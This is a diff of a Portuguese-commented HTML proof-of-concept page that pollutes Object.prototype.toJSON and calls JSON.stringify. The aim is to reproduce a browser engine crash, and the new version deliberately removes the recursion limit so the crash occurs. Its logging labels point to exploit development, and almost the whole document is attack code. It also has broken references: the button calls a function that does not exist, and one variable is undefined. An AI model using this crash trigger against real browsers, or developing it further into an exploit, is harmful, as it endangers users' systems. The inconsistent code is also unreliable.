@@ -2,13 +2,13 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>PoC Isolado v2.3r - Recursão Problemática Detalhada</title>
+    <title>PoC Isolado v2.3s - Sem Limite de Recursão (Crash Esperado)</title>
     <style> /* ... estilos como antes ... */ </style>
 </head>
 <body>
-    <h1>PoC Isolado v2.3r - Recursão Problemática Detalhada</h1>
-    <p>Tenta capturar o 'this' que leva ao crash idx < size() via console.</p>
-    <button onclick="runTest_v23r()">Iniciar Teste v2.3r</button>
+    <h1>PoC Isolado v2.3s - Sem Limite de Recursão (Crash/Lentidão Esperada)</h1>
+    <p>Este teste remove o limite de recursão para tentar replicar o crash original. FOCO NO CONSOLE DO NAVEGADOR.</p>
+    <button id="runBtn" onclick="runIsolatedTest()">Iniciar Teste v2.3s</button>
     <div id="output"></div>
 
     <script>
@@ -21,112 +21,105 @@
         const MEDIUM_PAUSE_S1 = 200;
 
         const logS1 = (message, type = 'info', funcName = '') => {
-            // Log primário no console do navegador
             console.log(`[${type.toUpperCase()}] ${funcName ? '['+funcName+'] ' : ''}${message}`);
-            // Log secundário na div
             const targetDiv = document.getElementById('output');
             if (targetDiv) { try { const timestamp = `[${new Date().toLocaleTimeString()}]`; const prefix = funcName ? `[${funcName}] ` : ''; const sanitizedMessage = String(message).replace(/</g, "&lt;").replace(/>/g, "&gt;"); const logClass = ['info', 'test', 'subtest', 'vuln', 'good', 'warn', 'error', 'leak', 'ptr', 'critical', 'escalation'].includes(type) ? type : 'info'; if(targetDiv.innerHTML.length > 300000){ targetDiv.innerHTML = targetDiv.innerHTML.substring(targetDiv.innerHTML.length - 150000); targetDiv.innerHTML = `<span>[Log Truncado...]</span>\n` + targetDiv.innerHTML; } targetDiv.innerHTML += `<span class="log-${logClass}">${timestamp} ${prefix}${sanitizedMessage}\n</span>`; targetDiv.scrollTop = targetDiv.scrollHeight; } catch(e) { console.error(`Erro DENTRO de logS1 (para div):`, e); }}
         };
-        const PAUSE_S1_FUNC = (ms = 10) => new Promise(r => setTimeout(r, ms)); // Pausa bem curta
+        const PAUSE_S1_FUNC = (ms = 10) => new Promise(r => setTimeout(r, ms));
         
-        const testObject_r = { p1: "alpha", p2: "beta", p3: { nested_r: true } };
-        let callCount_toJSON_r = 0;
-        let originalToJSON_Descriptor_r;
-        const ppKey_r = 'toJSON';
-        let lastThisBeforeCrashAttempt = null; // Para tentar ver o último 'this'
+        const testObject_s = { p1_s: "val_s1", p2_s: "val_s2", p3_s: { nested_s: true } };
+        let callCount_toJSON_s = 0;
+        let originalToJSON_Descriptor_s;
+        const ppKey_s = 'toJSON';
+        let lastThisBeforeObjectKeys_s = null;
+        let lastKeysFromObjectKeys_s = null;
 
-        function setupPrototypePollution_r() {
-            callCount_toJSON_r = 0;
-            lastThisBeforeCrashAttempt = null;
-            originalToJSON_Descriptor_r = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_r);
+        function setupPrototypePollution_s() {
+            callCount_toJSON_s = 0;
+            lastThisBeforeObjectKeys_s = null;
+            lastKeysFromObjectKeys_s = null;
+            originalToJSON_Descriptor_s = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_s);
 
-            Object.prototype[ppKey_r] = function() { 
-                callCount_toJSON_r++;
-                let logPrefix = `toJSON PoC v2.3r (Call ${callCount_toJSON_r})`;
+            Object.prototype[ppKey_s] = function() { 
+                callCount_toJSON_s++;
+                let logPrefix = `toJSON PoC v2.3s (Call ${callCount_toJSON_s})`;
                 
-                lastThisBeforeCrashAttempt = this; // Salva 'this' antes de qualquer operação
+                let thisIdentifier = "unknown_this_s";
+                if (this === testObject_s) thisIdentifier = "ROOT_S";
+                else if (this === testObject_s.p3_s) thisIdentifier = "NESTED_P3_S";
+                else if (Array.isArray(this)) thisIdentifier = "ARRAY_S";
+                else if (this && typeof this === 'object' && this.hasOwnProperty('final_structure_s')) thisIdentifier = "PREV_RETURN_OBJ_S";
 
-                let thisIdentifier = "unknown_this_r";
-                if (this === testObject_r) thisIdentifier = "ROOT_R";
-                else if (this === testObject_r.p3) thisIdentifier = "NESTED_P3_R";
-                else if (Array.isArray(this)) thisIdentifier = "ARRAY_R";
-                else if (this && typeof this === 'object' && this.hasOwnProperty('trigger_keys_r')) thisIdentifier = "PREV_RETURN_OBJ_R";
-
-
-                // LOG INTENSIVO NO CONSOLE - ESTA É NOSSA MELHOR CHANCE
-                console.log(`%c${logPrefix} - INVOKED! id='${thisIdentifier}', typeof='${typeof this}', constructor='${this && this.constructor ? this.constructor.name : 'N/A'}'`, "background: #222; color: #bada55");
-                if (callCount_toJSON_r > 1) { // Para a segunda chamada em diante, logue o 'this'
-                    console.log(`%c   ${logPrefix} - Conteúdo de 'this' (id='${thisIdentifier}'):`, "background: #222; color: #ffae42; font-weight:bold;");
-                    console.dir(this); // Tenta logar o objeto de forma interativa
-                }
-                
-                if (callCount_toJSON_r > 7) { // Limite de segurança para recursão excessiva
-                    console.warn(`${logPrefix} - Limite de chamadas toJSON atingido (${callCount_toJSON_r}). Retornando string para evitar loop infinito.`);
-                    logS1(`${logPrefix} - Limite de chamadas toJSON atingido. Retornando string.`, 'warn', 'toJSON_r');
-                    return "recursion_limit_r";
-                }
+                // Log ANTES de Object.keys, focado no console
+                console.log(`%c${logPrefix} - INVOKED! id='${thisIdentifier}', typeof='${typeof this}', constructor='${this && this.constructor ? this.constructor.name : 'N/A'}'`, "background: #111; color: #FFD700");
+                lastThisBeforeObjectKeys_s = this; // Salva 'this'
+                // console.dir(this); // DESCOMENTE COM MUITO CUIDADO, pode ser o que causa lentidão por si só se 'this' for complexo
 
                 let keys = [];
                 try {
-                    // PONTO CRÍTICO onde o crash idx < size() ou lentidão ocorria
+                    // PONTO CRÍTICO
                     keys = Object.keys(this); 
-                    console.log(`%c${logPrefix} - Object.keys(this) SUCESSO para id='${thisIdentifier}'. Chaves:`, "color:green", keys);
-                    logS1(`${logPrefix} - Object.keys(this) SUCESSO para id='${thisIdentifier}'. Chaves: [${keys.join(',')}]`, 'good', 'toJSON_r');
+                    lastKeysFromObjectKeys_s = keys; // Salva as chaves
+                    console.log(`%c${logPrefix} - Object.keys(this) SUCESSO para id='${thisIdentifier}'. Chaves: [${keys.join(',')}]`, "color:lime");
                     
-                    // Este é o tipo de retorno que causava o problema no PoC v2.3 original
+                    // Este é o retorno que causa a recursão problemática
                     return { 
-                        trigger_keys_r: true, // Para identificar este objeto retornado
-                        object_keys_r_array: keys 
+                        final_structure_s: true, 
+                        payload_keys_s: keys 
                     };
                 } catch (e) {
                     console.error(`${logPrefix} - ERRO em Object.keys(this) para id='${thisIdentifier}':`, e);
-                    logS1(`${logPrefix} - ERRO em Object.keys(this) para id='${thisIdentifier}': ${e.message}`, 'error', 'toJSON_r');
-                    return { "error_in_toJSON_r": true, "message": String(e.message) };
+                    logS1(`${logPrefix} - ERRO em Object.keys(this) para id='${thisIdentifier}': ${e.message}`, 'error', 'toJSON_s'); // Log na div se possível
+                    return { "error_in_toJSON_s": true, "message": String(e.message) };
                 }
             };
-            logS1("Poluição Object.prototype.toJSON APLICADA (v2.3r - Object.keys em todos 'this').", 'good', 'setup_r');
+            logS1("Poluição Object.prototype.toJSON APLICADA (v2.3s - SEM limite de recursão).", 'good', 'setup_s');
         }
 
-        function cleanupPrototypePollution_r() {
-            if (originalToJSON_Descriptor_r) {
-                Object.defineProperty(Object.prototype, ppKey_r, originalToJSON_Descriptor_r);
-            } else if (Object.prototype.hasOwnProperty(ppKey_r)) {
-                delete Object.prototype[ppKey_r];
+        function cleanupPrototypePollution_s() {
+            if (originalToJSON_Descriptor_s) {
+                Object.defineProperty(Object.prototype, ppKey_s, originalToJSON_Descriptor_s);
+            } else if (Object.prototype.hasOwnProperty(ppKey_s)) {
+                delete Object.prototype[ppKey_s];
             }
-            logS1("Object.prototype.toJSON restaurado.", 'good', 'cleanup_r');
+            logS1("Object.prototype.toJSON restaurado.", 'good', 'cleanup_s');
         }
 
-        async function runTest_v23r() {
+        async function runTest_v23s() {
             document.querySelectorAll('button').forEach(b => b.disabled = true);
             if (outputDivS1) outputDivS1.innerHTML = '';
-            logS1(`==== INICIANDO PoC Isolado v2.3r (Recursão Problemática Detalhada) ====`, 'test', 'runTest_r');
+            logS1(`==== INICIANDO PoC Isolado v2.3s (SEM Limite de Recursão - CRASH ESPERADO) ====`, 'test', 'runTest_s');
 
-            setupPrototypePollution_r();
+            setupPrototypePollution_s();
             
-            logS1(`Tentando JSON.stringify em testObject_r... (CRASH/LENTIDÃO ESPERADA)`, 'critical', 'runTest_r');
-            let result_r;
+            logS1(`Tentando JSON.stringify em testObject_s...`, 'critical', 'runTest_s');
+            let result_s;
             try {
-                // Nenhuma pausa longa antes de stringify para tentar pegar o crash "naturalmente"
-                result_r = JSON.stringify(testObject_r);
+                result_s = JSON.stringify(testObject_s); // ONDE O PROBLEMA OCORRE
                 
-                // Se chegar aqui, não travou como no PoC v2.3 original que dava o crash idx < size()
-                logS1(`JSON.stringify CONCLUÍDO (inesperado!). Resultado: ${result_r ? String(result_r).substring(0, 1000) : "N/A"}`, 'warn', 'runTest_r');
+                logS1(`JSON.stringify CONCLUÍDO (INESPERADO!). Resultado: ${result_s ? String(result_s).substring(0, 500) : "N/A"}`, 'warn', 'runTest_s');
             } catch (e) {
-                logS1(`ERRO CAPTURADO por JSON.stringify: ${e.message}`, 'error', 'runTest_r');
-                if (e.stack) logS1(`Stack: ${e.stack}`, 'error', 'runTest_r');
-                console.error("ERRO durante JSON.stringify em runTest_r:", e);
+                logS1(`ERRO CAPTURADO por JSON.stringify: ${e.message}`, 'error', 'runTest_s');
+                if (e.stack) logS1(`Stack: ${e.stack}`, 'error', 'runTest_s');
+                console.error("ERRO durante JSON.stringify em runTest_s:", e);
             } finally {
-                logS1("Entrou no finally de testPPJsonHijack_v23r.", 'info', 'runTest_r');
-                if (lastThisBeforeCrashAttempt) {
-                     console.log("%cÚLTIMO 'THIS' ANTES DE POSSÍVEL CRASH (dentro do finally):", "background:yellow; color:black; font-weight:bold;");
-                     console.dir(lastThisBeforeCrashAttempt);
-                     logS1(`ÚLTIMO 'THIS' ANTES DE POSSÍVEL CRASH (Chamada ${callCount_toJSON_r}): typeof=${typeof lastThisBeforeCrashAttempt}, constructor=${lastThisBeforeCrashAttempt && lastThisBeforeCrashAttempt.constructor ? lastThisBeforeCrashAttempt.constructor.name : 'N/A'}`, 'leak', 'runTest_r');
+                logS1("Entrou no finally de testPPJsonHijack_v23s.", 'info', 'runTest_s');
+                if (lastThisBeforeObjectKeys_s) {
+                     console.log("%c--- DADOS FINAIS CAPTURADOS (Chamada " + callCount_toJSON_s + ") ---", "background:red; color:white; font-size:1.2em;");
+                     console.log("%cÚLTIMO 'THIS' ANTES DO PROBLEMA:", "color:orange; font-weight:bold;");
+                     console.dir(lastThisBeforeObjectKeys_s);
+                     logS1(`ÚLTIMO 'THIS' (Call ${callCount_toJSON_s}): id=${lastThisBeforeObjectKeys_s === testObject_s ? "ROOT_S" : (Array.isArray(lastThisBeforeObjectKeys_s) ? "ARRAY_S" : "OTHER_S")}, typeof=${typeof lastThisBeforeObjectKeys_s}, constructor=${lastThisBeforeObjectKeys_s && lastThisBeforeObjectKeys_s.constructor ? lastThisBeforeObjectKeys_s.constructor.name : 'N/A'}`, 'leak', 'runTest_s');
+                     if(lastKeysFromObjectKeys_s) {
+                        console.log("%cÚLTIMAS 'KEYS' OBTIDAS DE Object.keys(this):", "color:orange; font-weight:bold;");
+                        console.log(lastKeysFromObjectKeys_s);
+                        logS1(`  ÚLTIMAS 'KEYS': [${lastKeysFromObjectKeys_s.join(',')}]`, 'leak', 'runTest_s');
+                     }
                 }
-                cleanupPrototypePollution_r();
+                cleanupPrototypePollution_s();
             }
             
-            await PAUSE_S1_FUNC(MEDIUM_PAUSE_S1);
-            logS1(`\n==== PoC Isolado v2.3r CONCLUÍDO ====`, 'test', 'runTest_r');
+            // Não haverá PAUSE_LAB aqui para não interferir na captura do estado final
+            logS1(`\n==== PoC Isolado v2.3s CONCLUÍDO (verifique o console para o estado antes do travamento/lentidão) ====`, 'test', 'runTest_s');
             document.querySelectorAll('button').forEach(b => b.disabled = false);
         }
     </script>
